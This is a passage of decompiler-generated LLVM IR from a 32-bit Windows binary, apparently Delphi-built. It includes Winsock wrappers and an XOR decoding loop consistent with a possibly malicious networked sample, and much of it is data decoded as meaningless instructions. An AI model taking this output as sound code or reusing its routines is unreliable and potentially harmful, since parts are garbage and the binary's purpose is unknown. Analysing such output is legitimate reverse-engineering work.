  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1) local_unnamed_addr {
dec_label_pc_404810:
  %ebx.1.reg2mem = alloca i32, !insn.addr !322
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !322
  %.pre-phi4.reg2mem = alloca i32*, !insn.addr !322
  %edi = alloca i32, align 8
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_404810.dec_label_pc_404891_crit_edge, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_404810.dec_label_pc_404891_crit_edge: ; preds = %dec_label_pc_404810
  %.pre = inttoptr i32 %0 to i32*, !insn.addr !324
  %.pre1 = add i32 %0, -4, !insn.addr !325
  %.pre3 = inttoptr i32 %.pre1 to i32*, !insn.addr !325
  store i32* %.pre3, i32** %.pre-phi4.reg2mem
  store i32* %.pre, i32** %.pre-phi.reg2mem
  br label %dec_label_pc_404891

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %4 = add i32 %2, 100, !insn.addr !326
  %5 = inttoptr i32 %4 to i32*, !insn.addr !326
  %6 = load i32, i32* %5, align 4, !insn.addr !326
  %7 = mul i32 %6, 1902802796, !insn.addr !326
  %8 = bitcast i32* %eax to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !327
  %10 = load i32, i32* %eax, align 4
  %11 = trunc i32 %10 to i8, !insn.addr !327
  %12 = add i8 %9, %11, !insn.addr !327
  %13 = inttoptr i32 %10 to i8*, !insn.addr !327
  store i8 %12, i8* %13, align 1, !insn.addr !327
  %14 = load i8, i8* %8, align 4, !insn.addr !328
  %15 = load i32, i32* %eax, align 4
  %16 = trunc i32 %15 to i8, !insn.addr !328
  %17 = add i8 %14, %16, !insn.addr !328
  %18 = inttoptr i32 %15 to i8*, !insn.addr !328
  store i8 %17, i8* %18, align 1, !insn.addr !328
  %19 = load i8, i8* %8, align 4, !insn.addr !329
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !329
  %22 = add i8 %19, %21, !insn.addr !329
  %23 = inttoptr i32 %20 to i8*, !insn.addr !329
  store i8 %22, i8* %23, align 1, !insn.addr !329
  %24 = load i8, i8* %8, align 4, !insn.addr !330
  %25 = load i32, i32* %eax, align 4
  %26 = trunc i32 %25 to i8, !insn.addr !330
  %27 = add i8 %24, %26, !insn.addr !330
  %28 = inttoptr i32 %25 to i8*, !insn.addr !330
  store i8 %27, i8* %28, align 1, !insn.addr !330
  %29 = load i8, i8* %8, align 4, !insn.addr !331
  %30 = load i32, i32* %eax, align 4
  %31 = trunc i32 %30 to i8, !insn.addr !331
  %32 = add i8 %29, %31, !insn.addr !331
  %33 = inttoptr i32 %30 to i8*, !insn.addr !331
  store i8 %32, i8* %33, align 1, !insn.addr !331
  %34 = load i8, i8* %8, align 4, !insn.addr !332
  %35 = load i32, i32* %eax, align 4
  %36 = trunc i32 %35 to i8, !insn.addr !332
  %37 = add i8 %34, %36, !insn.addr !332
  %38 = inttoptr i32 %35 to i8*, !insn.addr !332
  store i8 %37, i8* %38, align 1, !insn.addr !332
  %39 = load i8, i8* %8, align 4, !insn.addr !333
  %40 = load i32, i32* %eax, align 4
  %41 = trunc i32 %40 to i8, !insn.addr !333
  %42 = add i8 %39, %41, !insn.addr !333
  %43 = inttoptr i32 %40 to i8*, !insn.addr !333
  store i8 %42, i8* %43, align 1, !insn.addr !333
  %44 = load i8, i8* %8, align 4, !insn.addr !334
  %45 = load i32, i32* %eax, align 4
  %46 = trunc i32 %45 to i8, !insn.addr !334
  %47 = add i8 %44, %46, !insn.addr !334
  %48 = inttoptr i32 %45 to i8*, !insn.addr !334
  store i8 %47, i8* %48, align 1, !insn.addr !334
  %49 = load i8, i8* %8, align 4, !insn.addr !335
  %50 = load i32, i32* %eax, align 4
  %51 = trunc i32 %50 to i8, !insn.addr !335
  %52 = add i8 %49, %51, !insn.addr !335
  %53 = inttoptr i32 %50 to i8*, !insn.addr !335
  store i8 %52, i8* %53, align 1, !insn.addr !335
  %54 = load i8, i8* %8, align 4, !insn.addr !336
  %55 = load i32, i32* %eax, align 4
  %56 = trunc i32 %55 to i8, !insn.addr !336
  %57 = add i8 %54, %56, !insn.addr !336
  %58 = inttoptr i32 %55 to i8*, !insn.addr !336
  store i8 %57, i8* %58, align 1, !insn.addr !336
  %59 = load i8, i8* %8, align 4, !insn.addr !337
  %60 = load i32, i32* %eax, align 4
  %61 = trunc i32 %60 to i8, !insn.addr !337
  %62 = add i8 %59, %61, !insn.addr !337
  %63 = inttoptr i32 %60 to i8*, !insn.addr !337
  store i8 %62, i8* %63, align 1, !insn.addr !337
  %64 = load i8, i8* %8, align 4, !insn.addr !338
  %65 = load i32, i32* %eax, align 4
  %66 = trunc i32 %65 to i8, !insn.addr !338
  %67 = add i8 %64, %66, !insn.addr !338
  %68 = inttoptr i32 %65 to i8*, !insn.addr !338
  store i8 %67, i8* %68, align 1, !insn.addr !338
  %69 = load i8, i8* %8, align 4, !insn.addr !339
  %70 = load i32, i32* %eax, align 4
  %71 = trunc i32 %70 to i8, !insn.addr !339
  %72 = add i8 %69, %71, !insn.addr !339
  %73 = inttoptr i32 %70 to i8*, !insn.addr !339
  store i8 %72, i8* %73, align 1, !insn.addr !339
  %74 = load i8, i8* %8, align 4, !insn.addr !340
  %75 = load i32, i32* %eax, align 4
  %76 = trunc i32 %75 to i8, !insn.addr !340
  %77 = add i8 %74, %76, !insn.addr !340
  %78 = inttoptr i32 %75 to i8*, !insn.addr !340
  store i8 %77, i8* %78, align 1, !insn.addr !340
  %79 = load i8, i8* %8, align 4, !insn.addr !341
  %80 = load i32, i32* %eax, align 4
  %81 = trunc i32 %80 to i8, !insn.addr !341
  %82 = add i8 %79, %81, !insn.addr !341
  %83 = inttoptr i32 %80 to i8*, !insn.addr !341
  store i8 %82, i8* %83, align 1, !insn.addr !341
  %84 = load i8, i8* %8, align 4, !insn.addr !342
  %85 = load i32, i32* %eax, align 4
  %86 = trunc i32 %85 to i8, !insn.addr !342
  %87 = add i8 %84, %86, !insn.addr !342
  %88 = inttoptr i32 %85 to i8*, !insn.addr !342
  store i8 %87, i8* %88, align 1, !insn.addr !342
  %89 = load i8, i8* %8, align 4, !insn.addr !343
  %90 = load i32, i32* %eax, align 4
  %91 = trunc i32 %90 to i8, !insn.addr !343
  %92 = add i8 %89, %91, !insn.addr !343
  %93 = inttoptr i32 %90 to i8*, !insn.addr !343
  store i8 %92, i8* %93, align 1, !insn.addr !343
  %94 = load i8, i8* %8, align 4, !insn.addr !344
  %95 = load i32, i32* %eax, align 4
  %96 = trunc i32 %95 to i8, !insn.addr !344
  %97 = add i8 %94, %96, !insn.addr !344
  %98 = inttoptr i32 %95 to i8*, !insn.addr !344
  store i8 %97, i8* %98, align 1, !insn.addr !344
  %99 = load i8, i8* %8, align 4, !insn.addr !345
  %100 = load i32, i32* %eax, align 4
  %101 = trunc i32 %100 to i8, !insn.addr !345
  %102 = add i8 %99, %101, !insn.addr !345
  %103 = inttoptr i32 %100 to i8*, !insn.addr !345
  store i8 %102, i8* %103, align 1, !insn.addr !345
  %104 = load i8, i8* %8, align 4, !insn.addr !346
  %105 = load i32, i32* %eax, align 4
  %106 = trunc i32 %105 to i8, !insn.addr !346
  %107 = add i8 %104, %106, !insn.addr !346
  %108 = inttoptr i32 %105 to i8*, !insn.addr !346
  store i8 %107, i8* %108, align 1, !insn.addr !346
  %109 = load i8, i8* %8, align 4, !insn.addr !347
  %110 = load i32, i32* %eax, align 4
  %111 = trunc i32 %110 to i8, !insn.addr !347
  %112 = add i8 %109, %111, !insn.addr !347
  %113 = inttoptr i32 %110 to i8*, !insn.addr !347
  store i8 %112, i8* %113, align 1, !insn.addr !347
  %114 = load i8, i8* %8, align 4, !insn.addr !348
  %115 = load i32, i32* %eax, align 4
  %116 = trunc i32 %115 to i8, !insn.addr !348
  %117 = add i8 %114, %116, !insn.addr !348
  %118 = inttoptr i32 %115 to i8*, !insn.addr !348
  store i8 %117, i8* %118, align 1, !insn.addr !348
  %119 = add i32 %1, 66, !insn.addr !349
  %120 = inttoptr i32 %119 to i8*, !insn.addr !349
  %121 = load i8, i8* %120, align 1, !insn.addr !349
  %122 = load i32, i32* %eax, align 4, !insn.addr !349
  %123 = trunc i32 %122 to i8, !insn.addr !349
  %124 = add i8 %121, %123, !insn.addr !349
  store i8 %124, i8* %120, align 1, !insn.addr !349
  %125 = add i32 %1, 1, !insn.addr !350
  %126 = inttoptr i32 %7 to i32*
  %127 = load i32, i32* %126, align 4, !insn.addr !351
  %128 = load i32, i32* %edi, align 8, !insn.addr !352
  store i32 %128, i32* %126, align 4, !insn.addr !352
  %129 = load i32, i32* %eax, align 4, !insn.addr !353
  %130 = add i32 %7, -4
  %131 = inttoptr i32 %130 to i32*
  store i32 %129, i32* %131, align 4, !insn.addr !353
  %132 = add i32 %129, 113, !insn.addr !354
  %133 = inttoptr i32 %132 to i64 addrspace(258)*, !insn.addr !354
  %134 = load i64, i64 addrspace(258)* %133, align 4, !insn.addr !354
  %135 = call i32 @__asm_bound(i64 %134), !insn.addr !354
  %136 = trunc i32 %127 to i16, !insn.addr !355
  %137 = call i32 @__asm_insd(i16 %136), !insn.addr !355
  %138 = load i32, i32* %edi, align 8, !insn.addr !355
  %139 = inttoptr i32 %138 to i32*, !insn.addr !355
  store i32 %137, i32* %139, align 4, !insn.addr !355
  %140 = load i32, i32* %eax, align 4
  %141 = xor i32 %140, 61, !insn.addr !356
  store i32 %141, i32* %eax, align 4, !insn.addr !356
  %142 = inttoptr i32 %141 to i8*, !insn.addr !357
  %143 = load i8, i8* %142, align 1, !insn.addr !357
  %144 = trunc i32 %141 to i8, !insn.addr !357
  %145 = add i8 %143, %144, !insn.addr !357
  store i8 %145, i8* %142, align 1, !insn.addr !357
  %146 = load i32, i32* %eax, align 4
  %147 = inttoptr i32 %146 to i8*, !insn.addr !358
  %148 = load i8, i8* %147, align 1, !insn.addr !358
  %149 = trunc i32 %146 to i8, !insn.addr !358
  %150 = add i8 %148, %149, !insn.addr !358
  store i8 %150, i8* %147, align 1, !insn.addr !358
  %151 = load i32, i32* %eax, align 4
  %152 = inttoptr i32 %151 to i8*, !insn.addr !359
  %153 = load i8, i8* %152, align 1, !insn.addr !359
  %154 = trunc i32 %151 to i8, !insn.addr !359
  %155 = add i8 %153, %154, !insn.addr !359
  store i8 %155, i8* %152, align 1, !insn.addr !359
  %156 = load i32, i32* %eax, align 4
  %157 = inttoptr i32 %156 to i8*, !insn.addr !360
  %158 = load i8, i8* %157, align 1, !insn.addr !360
  %159 = trunc i32 %156 to i8, !insn.addr !360
  %160 = add i8 %158, %159, !insn.addr !360
  store i8 %160, i8* %157, align 1, !insn.addr !360
  %161 = load i32, i32* %eax, align 4
  %162 = inttoptr i32 %161 to i8*, !insn.addr !361
  %163 = load i8, i8* %162, align 1, !insn.addr !361
  %164 = trunc i32 %161 to i8, !insn.addr !361
  %165 = add i8 %163, %164, !insn.addr !361
  store i8 %165, i8* %162, align 1, !insn.addr !361
  %166 = load i32, i32* %eax, align 4
  %167 = inttoptr i32 %166 to i8*, !insn.addr !362
  %168 = load i8, i8* %167, align 1, !insn.addr !362
  %169 = trunc i32 %166 to i8, !insn.addr !362
  %170 = add i8 %168, %169, !insn.addr !362
  store i8 %170, i8* %167, align 1, !insn.addr !362
  %171 = load i32, i32* %eax, align 4
  %172 = inttoptr i32 %171 to i8*, !insn.addr !363
  %173 = load i8, i8* %172, align 1, !insn.addr !363
  %174 = trunc i32 %171 to i8, !insn.addr !363
  %175 = add i8 %173, %174, !insn.addr !363
  store i8 %175, i8* %172, align 1, !insn.addr !363
  %176 = load i32, i32* %eax, align 4
  %177 = inttoptr i32 %176 to i8*, !insn.addr !364
  %178 = load i8, i8* %177, align 1, !insn.addr !364
  %179 = trunc i32 %176 to i8, !insn.addr !364
  %180 = add i8 %178, %179, !insn.addr !364
  store i8 %180, i8* %177, align 1, !insn.addr !364
  %181 = load i32, i32* %eax, align 4
  %182 = inttoptr i32 %181 to i8*, !insn.addr !365
  %183 = load i8, i8* %182, align 1, !insn.addr !365
  %184 = trunc i32 %181 to i8, !insn.addr !365
  %185 = add i8 %183, %184, !insn.addr !365
  store i8 %185, i8* %182, align 1, !insn.addr !365
  %186 = load i32, i32* %eax, align 4
  %187 = inttoptr i32 %186 to i8*, !insn.addr !366
  %188 = load i8, i8* %187, align 1, !insn.addr !366
  %189 = trunc i32 %186 to i8, !insn.addr !366
  %190 = add i8 %188, %189, !insn.addr !366
  store i8 %190, i8* %187, align 1, !insn.addr !366
  %191 = load i32, i32* %eax, align 4
  %192 = inttoptr i32 %191 to i8*, !insn.addr !367
  %193 = load i8, i8* %192, align 1, !insn.addr !367
  %194 = trunc i32 %191 to i8, !insn.addr !367
  %195 = add i8 %193, %194, !insn.addr !367
  store i8 %195, i8* %192, align 1, !insn.addr !367
  %196 = load i32, i32* %eax, align 4
  %197 = inttoptr i32 %196 to i8*, !insn.addr !368
  %198 = load i8, i8* %197, align 1, !insn.addr !368
